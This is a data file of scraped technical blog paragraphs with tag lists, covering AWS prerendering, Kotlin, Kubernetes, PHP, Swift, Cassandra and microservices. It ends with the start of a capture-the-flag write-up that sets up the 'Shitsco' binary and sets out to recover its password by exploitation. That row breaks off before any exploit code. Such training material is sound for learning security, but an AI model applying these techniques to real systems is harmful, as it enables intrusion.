459,"The starter project uses the fantastic Serverless framework to deploy the two Lambdas and we migrated our Cloudformation stack to Serverless, too. You can find an exmaple pipeline configuration here. The first stage deploys the prerender Lambdas to North Virgina and saves the stack output in a JSON file, which can then be used by later stages. The second stage deploys the Cloudfront Distribution and associates the two prerender Lambdas by using the the fullqualified Lambda ARNs (ARN + Version) from the stack output of the previous stage. At the end of stage two we have a Cloudfront Distribution, S3 Bucket and properly configured Lambda@Edges. The third stage uploades the SPA files (JS, html, images) into the target bucket and is left out here for simplicity.","['AWS', 'Prerender', 'First Post', 'React', 'Web Development']",11
460,"The last two problems can be solved in one step. First of all some notes about our SPA and caching in general. We use (as many of you do too) hashed assets while bundling our SPA with webpack. So you get an __url__ with links to JS and CSS files with hashed names (something like index.246c671bb23d478c574d.js). These assets are cached for a very long time within Cloudfront. Until now our __url__ was never cached by setting cache-control to no-cache. The client will revalidate the __url__ on every request and its guaranted that if something changes (a JS file) the client will get the most up to date version. With P __url__ in place and a standard Cloudfront config this is a bit tricky, because every request will be routed to P __url__ and no caching takes place at all. BUT you can trick Cloudfront to cache your objects for a specific timerange and force the client to revalidate objects on a per request base. All you have to do is set cache-control to no-cache on object meta data and configure a minimum TTL greater than zero for your Cloudfront Distribution. This way you have the full control of what is served by controlling Cloudfronts cache.","['AWS', 'Prerender', 'First Post', 'React', 'Web Development']",11
461,"Nevertheless this does not solve the second problem at all. We are in full control of when a new release takes place (uploading the content to S3) or when content changes through Contentful. A basic solution would be to clear Cloudfronts cache on every release and every content change. This is super simple because we can create a Lambda which creates a Cloudfront Invalidation (for example on /*), which will result in the desired behavior. This Lambda can be invoked from the release process and through Contentfuls Webhook feature.","['AWS', 'Prerender', 'First Post', 'React', 'Web Development']",18
462,"Warming up the cache at least for some (or one) edge locations would be enough to keep the really first hit on a low latency. After some time digging around we had a solution which kills two birds with one stone. We implemented a sitemap-generator in another Lambda which will be asynchronously invoked by the cache clearing Lambda (due to long runtime while crawling our site). The generator will visit all reachable links and create a XML sitemap for SEO purposes. Afterwards this sitemap gets uploaded in the root of our S3 Bucket. The result is we have produced a sitemap for search engines and warmed up our Cloudfront cache by visiting all public visible sites. This works at least for two edge locations, but other crawlers (Google Bot) will do this for us, too. :)While we achieved our goals in making our SPA more SEO and user friendly by increasing overall performance and adding Open Graph support, theres a lot of room for improvements. Currently we invalidate the complete Cloudfront cache which is not necassary for all changes. We can enhance our SPA in general. But nevertheless the marketing team was quite happy and we are too. :)Lets come back to our Page Speed Insights benchmark. After integrating P __url__ we score a lot better: 96 out of 100 (before 79) for desktop devices respectively 84 out of 100 (before 58) for mobile devices.","['AWS', 'Prerender', 'First Post', 'React', 'Web Development']",11
463,"Both i OS and Android platforms are sufficiently complex that it takes years for engineers to be considered experts in a single platform. Mastering each platform requires knowledge of 2 officially supported programming languages, knowledge of the hardware, platform SDKs and various supporting libraries. Organizations that want to simultaneously support an i OS and Android application must support a minimum of 2 teams. As such, its very uncommon to have engineers whom are experienced in both platforms. This leads to further fragmentation as the two teams attempt to maintain feature parity, respond to defects while still leveraging the strengths of each platform. The ability to selectively share common logic across platforms with minimal friction while leveraging the intricacies of each platform enables teams to focus their energies on delivering features and value to the only stakeholder that truly mattersthe users of your app.","['Kotlin', 'Kotlin Native', 'Android', 'iOS', 'Cross Platform']",12
464,"Should integrate into the existing platform build toolchain and CI infrastructure Should leverage the underlying platform API and language with minimal friction particularly the user facing components such as UI and Notification Should integrate seamlessly without introducing the overhead of an additional runtime First class tooling support in terms of IDE support, compilers, lint checks Community and 3rd party library support Flutter is to apps what Silverlight was to the web. It compromises of own libraries, language and rendering. It was developed by Google independently of the Android team. Flutter utilizes the Dart programming language. Flutter aims to develop a common development platform and SDK by writing directly to view layer and providing its own SDK, UI widgets, runtime and programming environment. Flutters primary goals are to replace not augment the Android and SDK framework. The primary use case is for new greenfield projects that want to target multiple platforms with a consistent UI. Although Flutter can potentially deliver a high performance experience the ability to deliver consistent look and feel across platforms for complex apps that utilize the distinct features of each platform is challenging. Coincidentally one of the most popular and discussed Flutter apps, Hamilton does not utilize the Material or Cupertino guidelines Dart: Niche programming language that is not commonly used outside of Google. Existing developers will need to be retrained, hiring prospects challenging Flutter SDK: Aims to replace, not complement the native SDKs React is a Javascript UI framework developed by Facebook to develop modern single page web apps (SPA). React aims to describe UIs utilizing a declarative functional based approach. Since updating the DOM tree is costly, the framework will receive the desired UI as input and the React framework will perform a diff of the DOM before and after and perform only the required updates.","['Kotlin', 'Kotlin Native', 'Android', 'iOS', 'Cross Platform']",19
465,"Here we discuss a few strong reasons why Android is a preferred choice for on-demand app development:#1. Whopping market share- When it comes to market share, Android outpaces its Apple counterpart with a wide margin. Today, with over 88 percent market share, Android OS empowers most of the smartphones in the world. Therefore, it is always wise to have an on-demand app on Google Play to address a huge audience.#2. Easy Customization- On-demand apps need regular updates to meet ever-changing customer requirements. As compared to i OS, Android apps have a higher customizability. Entrepreneurs can readily modify apps to meet customer requirements and grab new opportunities for boosting their business.#3. Features- Maps, GPS functionality, easy navigation, etc. are a few of the most important features for the on-demand applications. Android OS has an edge over i OS when it comes to these features. On-demand apps can facilitate users to find the real-time location with the help of inbuilt Google Maps. Whats more, apps like Gmail can enhance the communication between companies and customers.#4. Data Storage- Android has a clear whip hand when it comes to cloud storage. With 15GB storage capacity for free and cross-platform support, Google Drive is the best platform to save valuable data. Also, Androids cloud storage is easier to access and more effective as compared to i Cloud. The on-demand app deals with the customers data and companies can serve this purpose through Google Drive integration in an app.#5. Voice Assistance- Google Assistant is backed by the search engine giant Google, and therefore, it has an access to zillions of data points. It makes Google Assistant more powerful and versatile as compared to Siri or any other voice assistant. Users of on-demand apps can easily search and stay updated with contextual information with the help of Google Assistant. It has a conversational approach and it can offer customized suggestions to the app users.","['Mobile App Development', 'Android App Development', 'Android']",17
466,"If a customer-centric and innovative mobile app solution is all you need, youre at the right place! Notifications- Every on-demand app needs to send notifications to keep its users updated with the useful information. Be it promotional offers or company activities, notifications can play a vital role in spreading awareness and boosting business. Android OS can handle multiple notifications from a single app very well. The app users can also respond to the notification without opening an app. Android has a persistent notification feature which is yet to be adopted by Apple.#7. Multi-language Support- Most of the on-demand apps are of B2C type, and therefore, it is of utmost importance that they are available in all the languages understood by the target audience. When it comes to multiple languages, Android OS supports over 100 languages whereas i OS supports just over 34 languages. Android OS is therefore suitable for developing apps for e Commerce, health, and other people-oriented sectors.#8. Cost-effectiveness- How about getting an app that can seamlessly work on millions of devices globally? Startups or established companies can leverage the benefits of the ubiquitousness of Android devices. They can address a huge smartphone-using audience irrespective of display size and device type in a cost-effective way. All they need to find a top Android app development company.#9. Technologically advanced- Most of the Android devices offer expandable memory. Even if the on-demand app is of a large size, it is manageable in the Android device with a micro SD card. Also, Android mobile manufacturers are spread across the world, and they can come forward with innovative features using technological advancements. In other words, the Android community is thriving with technologically advanced features and companies can utilize these features to make apps more attractive and user-friendly.","['Mobile App Development', 'Android App Development', 'Android']",17
467,"After adding the data source we can move on to adding a dashboard. On the left hand side select the + then import. The JSON that we need for this dashboard can be found in the repo. After loading the JSON, select the datasource to be the influxdb source we created earlier and select import. The dashboard should look similar to the one below. The dashboard that we imported contains the system status panel and the task status panel. Both of theses panels have a y-axis that represents the system/task status and an x-axis of time. The main difference between the two is by which tags the data is being grouped by.","['Docker', 'Golang', 'Influxdb', 'Grafana', 'Web Development']",15
468,"I saw The Information Superhighway come and go. Its now so part of the fabric of life that hyping it would at best gain you kindly condescending looks. I saw the long, slow insistence that was J2EE. Again, half true, mostly just too complicated to be worth it. A decade or more of death-march projects, billions spent (most publicly in government) a handful of surviving systems remain, encrusting organisations legacy IT estates. Taking the name of Best Practice in vain didnt get us much value for money.","['Docker', 'Kubernetes', 'Cloud']",16
469,"The real trick is spotting the black sheep in the enterprise herd: the one thats going in the right direction. Fifteen years ago VMware revolutionised datacentres with virtualisation. I was there, it was brilliant. The legacy of that quantum leap lives on in ec2 and compute engine instances. Provisioning a server used to take 36 months, with a mosaic of logistics and people. Now servers appear and disappear by the thousands, second by second, with little more than the click of a mouse or the flicker of an API call.","['Docker', 'Kubernetes', 'Cloud']",10
470,"If one task decides to take all the compute duvet in the middle of the night, the others are left shivering in the cold and the system goes down. You have to think about partitioning networking, avoiding privilege escalations, keeping rogue workloads from roaming around looking for ways to subvert the platform. These turn out to be more difficult, less obvious and more confusingly unclear than youd like. To get to one platform thats fit to run them all, you have to start yak-shaving. That may be OK, but bear in mind it could well take a dedicated team many months to not quite get there. Thats a lot of time-to-market and budget spent.","['Docker', 'Kubernetes', 'Cloud']",10
471,"There are flies in this ointment, (e.g. bin-packing efficiency) but they dont necessarily spoil the soup if you can swallow them. The real killer is incidental complexity. When you consider that Kubernetes is a behemoth of a platform, running a single platform for a single behemoth of an organisation, say Google, makes sense. One massive container ship can carry a lot of cargo. But now were looking at a fleet of container ships and only lightly loading them with a few containers. Theres a massive operational overhead in running a fleet like that, so perhaps, in fact, the better option is to simply run your workloads on a few dedicated servers.","['Docker', 'Kubernetes', 'Cloud']",10
472,"Which makes this a double-circular argument. The reason to use Kubernetes is to efficiently utilise a large, fixed pool of resource. Cloud compute is not a fixed pool of resource. Autoscaling is key to efficiently using cloud. The original reason to use Kubernetes was efficiency.","['Docker', 'Kubernetes', 'Cloud']",10
473,"Introducing name-driven development, where theres nothing more than a name for an imagined product, but that name paints a picture. The container world, from Docker to Kubernetes, is marine-themed so, sticking with that, a coracle is a minimum viable boat. Its simple construction is lightweight, portable and will carry one person. Its intentionally not designed for scale, its designed to carry one load, conveniently and with a minimum of fuss. I think it speaks of a genuinely useful alternative.","['Docker', 'Kubernetes', 'Cloud']",10
474,"SQL, like memory management, is a concept you can unpack when you need to. Further down the line of your career. Then after you learn it, you can compress it back down again and spend more of your mental capacity on other things most of the time. I used to write SQL statements every day. Now maybe I do so once a month? And thats against a major application thats reached a scale that most beginner apps never will.","['Programming', 'Conceptual Compression', 'Sql', 'Beginners', 'Progress']",8
475,Were currently living through an explosion of conceptual expansion and experimentation on the client-side in the web application world. Lots of new ideas and approaches churning rapidly. But its also needlessly intimidating in many ways. We dont all need to spend hours or days learning how to configure build pipelines. Some day our leaky abstractions will be good enough that the conceptual compression will relegate such tooling to appliance status as well. That will be a good day.,"['Programming', 'Conceptual Compression', 'Sql', 'Beginners', 'Progress']",10
476,"What a small web-based business needs, no matter how big you think you will eventually get, is LAMP. For those who dont know, LAMP is an acronym defining your operating system, web server, database, and programming language. In this case, Linux, Apache, My SQL, and PHP. If you are a business oriented founder or senior non-technical leader and you rely on others to advise you on technology, you have likely heard LAMP (specifically the PHP or My SQL part) is passe, not good enough, too simple, and doesnt have the performance you need. Facts Most large e Commerce, social media, and wiki sites started on PHP (or similar) and still use it extensively, including Amazon, Facebook, and Wikipedia. Over 80% of the top 10M web sites use PHP.","['Programming', 'PHP', 'Java', 'Software Architecture', 'Software Maintenance']",19
477,"Beyond those facts, every non-technical founder and business leader needs to understand the following about coding languages, enterprise solutions, and development Design! Architecture and system design are far more important than your choice of language or anything else. Picking the right language or technology is worthless if you have bad system architecture. Java is a compiled language (sort of) and as such, is faster than PHP. However, in-practice PHP is faster on the web (usually). Because PHP is designed for the web. PHP frameworks are designed for the enterprise web. Enterprise solutions are about architecture, not technology or languages. Letting someone sell you on a language (like Java) without having a full evaluation and discussions about architecture and design is like letting a home builder sell you on buying a house youve never seen because his contractors use only the latest and greatest hammer (or sledge hammer in the case of Java EE).","['Programming', 'PHP', 'Java', 'Software Architecture', 'Software Maintenance']",9
478,"You choose tools for the job at hand. You choose architecture and design for the end goal. Saying a language is not enterprise is like saying a hammer cant be used to build skyscrapers because it is also used to build houses. I have heard many a misguided MBA-type say something absurd like, PHP is for mom and pop shops. Poor design is for mom and pop. PHP works just fine in the hands of a trained software engineer who knows how to design for the enterprise. PHP has no shortcoming that prevents that and in the case of the web, PHP has many advantages over most languages.","['Programming', 'PHP', 'Java', 'Software Architecture', 'Software Maintenance']",9
479,"Build for scale now, but actually scale later. Dont let anyone tell you you have to build now with the exact tools you need later because someday you will be the size of Amazon or Facebook (both of which still use PHP and similar languages extensively). What you need now is to design well and use simple, inexpensive tools. If you have done your design correctly you will easily be able to scale later. Facebook started on PHP, is still on PHP, and they look like they scaled just fine. Wikipedia is PHP, looks like they scaled just fine.","['Programming', 'PHP', 'Java', 'Software Architecture', 'Software Maintenance']",19
480,"I have seen so many disasters with companies and projects that come right out of the gate with a team of Java Enterprise programmers because someone has sold them on Javas speed and enterprise capabilities instead of taking the time to really assess their needs and resources. One local startup I talked to hired 14 Java programmers and support staff to start their company. They were convinced they needed Java to compete in the enterprise space. That size team is a $2M per year proposition in the US. They couldnt afford that so they hired them in India for a total of $100k a year (against my advice). Long story short, what ensued was a five year disaster that cost the company millions and left them with a bloated, outdated enterprise-level mess. Even worse, by the time they were done, you know what was the new right language for their application? What they needed could have been done with two good LAMP (P could be for Python in this case) developers and one strong architect/developer lead. Thats a $300k a year proposition that could have gotten their product to market quickly so they could adapt and evolve.","['Programming', 'PHP', 'Java', 'Software Architecture', 'Software Maintenance']",2
481,"Nothing is more important than this. In 20 years working in software development I have seen programmers who were geniuses and others that were abysmal, sitting right next to each other, making the same money, with the same titles. There is no non-technical manager who can tell the difference, and the truth is sometimes technical managers cant either. I have seen the worst programmers touted as the best simply because they are fast but when you look at their code its an unmaintainable mess. If you are a non-technical founder or business leader and you have to choose programmers, get help. The person you want advising you has three qualifications without exception: a degree in computer science, extensive experience working as a software engineer, and experience leading software engineers. Do not settle for technical recruiters or advisers that have worked in technology but have never written a line of code or designed a system. They talk a good game, but if they dont have a Github or Bitbucket account full of code and the education to back it up, they are not who should be advising you.","['Programming', 'PHP', 'Java', 'Software Architecture', 'Software Maintenance']",2
482,"I play a lot of video games. As of 2019, most of my playing hours mainly revolves around NBA 2K19 and Fortnite: Battle Royale. While the latter provides endless hours of fun with friends online, playing NBA 2K represents a lifelong passion of basketball. I especially enjoy the Franchise mode, where you take over one of 30 NBA teams and try to construct a championship roster. While I have more than a few complaints regarding player development and trade logic, the mode still allows my inner basketball GM to flourish. Thats why RPGs (role-playing games) are my favorite games. A common theme in most is spending time nurturing and developing characters, and feeling proud of the finished product afterwards.","['Swift', 'Basketball', 'Coding', 'iOS App Development', 'Game Development']",2
483,"So why not try to build one myself? Ive recently been interested in making a basketball game application, and Swift is a fun language to work with. Swift is a compiled language developed by Apple, for use in creating applications for the i Phone. Although not a widely used language like Java or Python, the syntax should read simply enough. Ive made other apps as well! For this first part, well need to construct the basic logic for a basketball game. We have players who have offensive and defensive skills. Players join together to form a team. Teams play against each other in games, and they either win or lose. Now we just need to flesh out these concepts in code.","['Swift', 'Basketball', 'Coding', 'iOS App Development', 'Game Development']",6
484,"First, well create a new project in Xcode, a Mac IDE provided by Apple. Open Xcode -> New -> Project -> Single View App. You should see this screen: Name your project, choose your project folder location, and lets begin! At the heart of basketball are the players. So its fitting that we start here. Lets create a new file in our project called Player Functions.swift. When I work on potentially sizable projects, its easier to visualize things when you separate different areas into files of their own. A great thing about Swift is that classes and functions declared once are globally available throughout the app. If you want to work with Javascript or Python, make sure you import/export your files.","['Swift', 'Basketball', 'Coding', 'iOS App Development', 'Game Development']",18
485,"We want to create a model of a basketball player, and we also want to store certain information about our players. We can create a Player class for this. Examples of possible data include player attributes like three-point rating, dunking ability or free throw skill. These are all definitely important attributes for basketball, but lets not get bogged down with all those details for now. Instead, well simply assign an offense rating and a defense rating to our players to encompass all the essentials. It should look like so: The init method is used in Swift classes in creating an instance. So, well create each player with an initial offense and defense rating. This class looks good for now, lets come back to it in a bit.","['Swift', 'Basketball', 'Coding', 'iOS App Development', 'Game Development']",14
486,"For our new Team class, we definitely want a variable to store all the players on the roster. We could also keep a team rating for both offense and defense, to represent the overall skill of a team on both sides of the ball. I design it like so: Now that weve got our players and teams modeled, how will we actually code a basketball match? Im sure there are multiple legitimate ways to perform a game simulation. Most will involve creating a Game class. Lets do that in a new file called Game Functions.swift. If were creating an instance of a game, we want to do so with two teams. There is no basketball game without two opposing teams. Also, lets keep track of the scores for each of the teams, so well know who wins and loses at the end: The scores will start at zero, but well be updating those variables with some class functions. Games can be broken down into a series of offensive and defensives possessions for each team. Depending on various factors teams may or may not score on each possession. Therefore, our first function, play Possession, will execute some logic to determine if a team will score in each possession: Lets break this down. team Offense and team Defense are what we are using to compute our result for each basketball possession. If the offense score of team 1 is higher than the defense score of team 2, the function should return the points scored, which is 2 in this case. If the defense score is higher, the function will return 0. Now, there are cases in real-life basketball where teams can score 3 points or 1 point, but lets keep it simple for now. Also, Int.random returns a number in the range you provide it. We want to randomize the values for each team and each possession so that we dont have a team scoring on every possession. Thats not very realistic, unless youre the Warriors.","['Swift', 'Basketball', 'Coding', 'iOS App Development', 'Game Development']",14
487,"We should now come back to Team Functions.swift. For each team, the easy part will be adding the players to the roster. We can just append five generated Players to the roster array of a Team. Next will be determining the overall offense and defense team ratings. For this, I just take the average ratings of all players on the roster. The final function will look like this: Now, lets see what this looks like.","['Swift', 'Basketball', 'Coding', 'iOS App Development', 'Game Development']",6
488,"To run this, lets head back to our View C __url__ file. The code in this file executes when running the app, specifically the code within the view Did Load method. Within that method, well run five different games, using the code we just wrote: In each game, well have different players and different teams. Lets run the app by clicking the Play icon near the top. Heres the result in Xcodes console: Success! Weve got ourselves five pseudo-regulation basketball game results, and they look pretty decent. We do have quite a bit of fluctuation with the total points scored for some games, but at least the games seem to be closely contested for the most part.","['Swift', 'Basketball', 'Coding', 'iOS App Development', 'Game Development']",6
489,"The components of our checklist effectively just represent our workflow, communication, and planning. We have it broken into a few main sections with sub bullets under each. For instance: Has the work been completed You might be surprised to know that sometimes deployments used to get scheduled before the work was done. We really want to avoid this scenario. Deployments should really only be scheduled when the work is complete. If youre trying to squish in three sprints worth of work into the last few nights because your deployment is already planned, you are definitely going to be introducing bugs and defects, regressions, and poorly built and tested features. Lacking a few features in an otherwise well-built system is typically better than producing a bunch of poor quality last-minute features.","['Deployment', 'Development', 'Project Management']",1
490,"Primary key design driven tables: all tables must have a declared primary key (PK), which can be composed of multiple table columns. Table data is stored in PK order, which makes it very efficient and fast for PK lookups. Like other PK-based systems, the implementation needs to be modeled with caution and target use cases in mind to achieve the best performance.","['Programming', 'Google', 'Technology', 'Tech', 'Software Development']",8
491,"Indexes: Cloud Spanner supports secondary indexes. An index consists of the indexed columns and all PK columns. Optionally, an index can also contain other non-indexed columns. An index can be interleaved with a parent table to speed up queries. Several limitations apply to indexes, like the maximum number of additional columns stored within the index. Also querying via indexes may not be as straightforward as in other RDBMSs.","['Programming', 'Google', 'Technology', 'Tech', 'Software Development']",8
492,"Cloud Spanner doesnt support partitions per-se. It divides data internally into splits based on the primary key ranges. The splitting is done automatically to balance the load across the Cloud Spanner cluster. A very handy Cloud Spanner feature, is load base splitting of the parent table (the table that is not interleaved with another). Spanner automatically detects if a split contains data that is read more frequently then the data in other splits and may decide to further split it. This way more nodes can be involved in the querying and this effectively also increases bandwidth.","['Programming', 'Google', 'Technology', 'Tech', 'Software Development']",11
493,"Lets look at a pair of unit tests that could ensure were pulling the click count from props. Lets create a new file, click-counter/click-counter-component.test.js: I like to create little factory functions to make it easier to write tests. In this case, create Counter will take a number of clicks to inject, and return a rendered component using that number of clicks: With the tests written, its time to create our Click Counter display component. I've colocated mine in the same folder with my test file, with the name, click-counter-component.js. First, let us write a component fragment and watch our test fail: If we save and run our tests, well get a Type Error, which currently triggers Node's Unhandled Promise Rejection Warningeventually, Node will stop with the irritating warnings with the extra paragraph of Deprecation Warning and just throw an Unhandled Promise Rejection Error, instead. We get the Type Error because our selection returns null, and we are trying to run.trim() on it. Let's fix that by rendering the expected selector: Great. Now we should have one passing test, and one failing test: To fix it, take the count as a prop, and use the live prop value in the JSX: Now our whole test suite is passing: Time to test the button. First, add the test and watch it fail (TDD style): This produces a failing test: Now well implement the click button: And the test passes: Now we just need to implement the state logic and hook up the event handler.","['JavaScript', 'Technology', 'Software Development', 'Programming', 'Tdd']",15
494,"Now all the unit tests will pass: Just one more step: Connecting our behavior to our component. We can do that with a container component. Ill just call that __url__ and colocate it with the other files. It should look something like this: Thats it. This components only job is to connect our state management and pass the state in as props to our unit-tested pure component. To test it, load the app in your browser and click the click button.","['JavaScript', 'Technology', 'Software Development', 'Programming', 'Tdd']",15
495,"Apache Cassandra was open sourced by Facebook in 2008 after its success as the Inbox Search store inside Facebook. It was designed as a distributed storage system for managing structured data that can scale to a very large size across many commodity servers, with no single point of failure. High availability is achieved using eventually consistent replication which means that the database will eventually reach a consistent state assuming no new updates are received. As the data is replicated, the latest version of something is sitting on some node in the cluster, but older versions are still out there on other nodes. Reads execute on the closest replica and data is repaired in the background for increased read throughput. In terms of the CAP Theorem, Apache Cassandra is an Available and Partition-tolerant (AP) database.","['Cassandra', 'NoSQL', 'Datastax', 'Databases', 'Kubernetes']",10
496,"The architecture of a single region, 3-node cluster with replication factor 3 is shown in the figure below. The data partitioning scheme used is that of a ring-based topology that uses consistent hashing to partition the keyspace into token ranges and then maps them onto virtual nodes where each physical node has multiple virtual nodes. Each token range is essentially a partition of data, noted as p1, p2, p3 and more. Each such partition has 3 replicas that are placed on the 3 different nodes. Note that all the 3 replicas are exactly equal and there is no concept of a partition leader that is used in Consistent and Partition-tolerant (CP) databases such as Google Spanner or its derivative such as Yuga Byte DB. Apache Cassandras approach instead takes inspiration from the Amazon Dynamo paper published in 2007.","['Cassandra', 'NoSQL', 'Datastax', 'Databases', 'Kubernetes']",8
497,"This post on Medium has a detailed discussion on how to pick consistency levels in Cassandra. Lower consistency levels like ONE improve throughput, latency, and availability at the expense of data correctness by not involving other replicas for the operation. And thats the primary design point of Apache Cassandrastore large volumes of data at low consistency and high availability. However, when correctness of data starts becoming important as is the case in transactional apps, users are advised to pick read and write consistency levels that are high enough to overlap. The understanding here is that this will lead to strong consistency and is typically expressed as W + R > RF, where W is the write consistency level, R is the read consistency level, and RF is the replication factor. For example, if RF = 3, a QUORUM request will require responses from at least two of the three replicas. If QUORUM is used for both writes and reads (which means W=2 and R=2), at least one of the replicas is guaranteed to participate in both the write and the read request, which in turn guarantees that the latest write will be read. In a multi-datacenter environment, LOCAL_QUORUM should be used to ensure that reads can see the latest write from within the same datacenter.","['Cassandra', 'NoSQL', 'Datastax', 'Databases', 'Kubernetes']",8
498,"Application developers choosing Apache Cassandra as their default operational database understand well that their choice does not support multi-shard (aka distributed) ACID transactions. But they mistakenly believe that they can use Cassandra features such as quorum writes/reads, lightweight transactions and secondary indexes to achieve single-key ACID guarantees. This is because the Cassandra marketing and technical documentation over the years has promoted it as a consistent-enough database. As we reviewed in this post, that is far from the truth. The only good use of Apache Cassandra is in context of its original intent as a inexpensive, eventually consistent store for large volumes of data. Newer Cassandra compatible databases such as Data Stax Enterprise and Scylla DB suffer from the same problems as Apache Cassandra since they have not changed the design of the eventually consistent core.","['Cassandra', 'NoSQL', 'Datastax', 'Databases', 'Kubernetes']",8
499,"I was tempted to title this article, Yet Another Microservices Article because so much has been written on the topic already; but I felt compelled to share my own thoughts and experiences with this style of architecture because most of the literature out there treats microservices as some sort of panacea. Drawbacks are often not discussed, or hand-waved away with simple one liners like just use event sourcing! Here Ill discuss where we had success and where we had failure. Ill try not to repeat what many others have said before me, because at this point theres a mountain of material thats already been written on the topic. Finally, before we begin, I think its important to state that my observations and thoughts come from my experiences: much like yourself I have organizational constraints, business constraints (those darn timelines! Ill try to be honest where I discuss decisions that we made due to some of those constraints, and how I think we could have done better had we made further investments. I suppose I should also state the obvious: the opinions presented here are all mine, not of my employer.","['Microservices', 'Cloud', 'Architecture', 'Azure', 'Programming']",10
500,"I am a Platform Architect for a system used by thousands of businesses, primarily in the health, wellness and beauty space (e.g. The system includes booking, point of sale, appointment reminders, etc. It is used by both the merchants (receptionist booking appointments, taking payments, etc) and their customers via a booking website we provide each of our members, or optionally via APIs if they choose to go with a more integrated experience. Naturally, because downtime can lead to poor customer experience and lost sales, businesses get really angry at us when there is unplanned downtime. Given that, we tend to be very risk averse.","['Microservices', 'Cloud', 'Architecture', 'Azure', 'Programming']",6
501,"If I go by what I hear at conferences and read about online; to have microservices you need Docker, Kafka, Kubernetes, and 100% automation. If your organization already uses those technologies great. For everyone else, dont try to shove ten new things down your tech teams throat. Itll take forever to get everyone trained. If your company is anything like mine, something more important will come up and continuously sidelined so that staff can work on the higher priority tasks. Further, youll be concentrating on the wrong things; I believe the focus should at first be on the architecture and changing the organization's mindset on how to develop and deliver smaller services. New infrastructure such as Kafka can be integrated over time.","['Microservices', 'Cloud', 'Architecture', 'Azure', 'Programming']",10
502,"My company started its shift to the cloud and microservices in 2015. But by late 2016 we had barely made a dent in our Azure footprint. The reason was two fold: the cloud was new (to us) and therefore scary. The business, being risk averse was dragging its feet in moving existing features to the cloud and understandably only wanted to add new features to the cloud, because new features are less risky. This presented us with the next problem; new features almost always rely on existing dataand our data wasnt in Azure. Given this, it was far easier to add a feature to the monolith than build it out on Azure. The few services that were built out on Azure used the monoliths API to get the data it needed; as such they suffered from the issues described in the previous section.","['Microservices', 'Cloud', 'Architecture', 'Azure', 'Programming']",10
503,"Start publishing data from the monolith. Since the monolith uses the active record pattern and there are numerous areas that can mutate business objects (the merchant facing app, the api or the customer facing app), the most logical place to add publishing code was in the business object. This has lead to chunky published messages coming from the monolith. customer-changed, but there are times I think where we also want finer-grained messages, perhaps in addition to a chunky message, such as when the status of an appointment changes. I think its perfectly fine to have multiple events fire when something happens.","['Microservices', 'Cloud', 'Architecture', 'Azure', 'Programming']",6
504,"We have the following two problems: first, risk aversion, what happens if Azure Service Bus goes down?, the next was the style of how the monolith was written. Given its SQL Server backend, the monolith has atomic transactional semantics; that is, either something worked or it didnt, and it all happens at once. But here we are introducing the bus, which, as with any other cloud service; is not transactional. Our solution was to use publish to an MSMQ queue, since it supports 2-phase commit. If the data gets to MSMQ we know that it will eventually get to Azure Service Bus. We then have a very simple process that runs as a Windows Services (the dispatcher) that picks up messages from MSMQ and puts them onto the bus. Im probably the only person on the planet that would use the words 2-phase commit and microservices in the same sentence; but in our case the overhead wasnt too bad. It allowed us to quickly and easily add event publishing to legacy code without having to figure out how to inject something like the saga pattern into legacy code (though Id suggest this for any new code over a 2-phase commit), and finally, it allowed me to tell management with a straight face that the code on the monolith would not require a large change, and that we could continue to operate core functionality even in the event of an Azure Service Bus outage, which at the time, was very new for us (its been very reliable).","['Microservices', 'Cloud', 'Architecture', 'Azure', 'Programming']",10
505,"One of the things I think we got right was to implement an Identity service as one of our first stories. Our Identity service issues JSON Web Tokens (JWT). JWTs allow us to do stateless authentication because the token itself carries signed data. They do tend to be quite a bit bigger than traditional tokens, but they carry very useful information such as user id and user roles. Without JWT, many of our microservices would either be required to duplicate access-checks(does this user have access to this merchant account, does he or she have the proper role to access this feature, etc), or it would have to make an API request to Identity. This would add latency to every call, and would make the Identity Service a single point of failure. With JWT, Identity remains a critical component, but a failure in Identity does not cause an outage for all users at the same time; but rather an outage only for users who havent logged in yet or who have an expired token. This at least gives us time to resolve the problem before most people even know there was an issue.","['Microservices', 'Cloud', 'Architecture', 'Azure', 'Programming']",11
506,"Anyway, download Shitsco to your 32 or 64 bit Linux system. Shitsco is a dynamically linked 32-bit binary so if you are using a 64-bit platform you will need to enable multiarch-support and install i386 specific libraries. The commands will vary from platform to platform and even version to version, but on my Ubuntu VM this __url__ dpkgadd-architecture i386sudo apt-get updatesudo apt-get install multiarch-supportsudo apt-get install libc6:i386 libstdc++6:i386georgia@geode:~/shitsco$ file shitscoshitsco: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, Build ID[sha1]=bdc9578686b425f927ce094bd5f4e07ba633ae2d, stripped To use Shitsco locally, youll need to create an account shitsco on your Linux system with the home directory /home/shitsco.georgia@geode:~$ sudo adduser shitsco Adding user `shitsco Adding new group `shitsco (1002)Adding new user `shitsco (1002) with group `shitsco Creating home directory `/home/shitsco Copying files from `/etc/skel Enter new UNIX password: Retype new UNIX password:passwd: password updated successfully Changing the user information for shitsco Enter the new value, or press ENTER for the default Full Name []: Room Number []: Work Phone []: Home Phone []: Other []: Is the information correct? [Y/n] YIn that directory create a file called password and put a word there.georgia@geode:/home/shitsco2$ su shitsco Password:shitsco@geode:~$ echo -n foobar > /home/shitsco/password Be sure not to include a newline at the end like in the console output shown below. You can use the -n flag in the echo command to not put the trailing newline character. The lack of newline is significant as we will see when we analyze the binary code. If we have a newline it will be read in as part of password global variable. But when we enter a password a newline will signify the end of our input and not be included in the password. For my example Im using foobar as the password. Now promptly forget the password that you created, as one of our goals will be to figure out the password using exploitation. In the actual CTF the password file was set up for you on the target box.georgia@geode:/home/shitsco$ cat passwordfoobargeorgia@geode:/home/shitsco$Amusingly enough I happened to be working on the Shitsco problem while I was in the audience waiting for my keynote at Ciscos internal Seccon conference. I had not gotten the hint from the name, but it did occur to me when I ran the binary for the first time. Before I start any kind of reverse engineering I like to get familiar with the binarys functionality.georgia@geode:~/shitsco$./shitscooooooooo8 oooo o88 o8888 888ooooo oooo o888oo oooooooo8 ooooooo ooooooo888oooooo 888 888 888 888 888ooooooo 888 888 888 888888 888 888 888 888 888 888 888 888o88oooo888 o888o o888o o888o 888o 88oooooo88 88ooo888 88ooo88Welcome to Shitsco Internet Operating System (IOS)For a command list, enter?$?==========Available Commands==========|enable ||ping ||tracert ||? ||shell ||set ||show ||credits ||quit |======================================Type? followed by a command for more detailed information$Anyone who has done any network device pentesting or IT work is probably familiar with this dialog. One thing that popped right out at me is the shell command. Given that this is a CTF problem, I doubt it is that easy. But there is no harm in trying.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 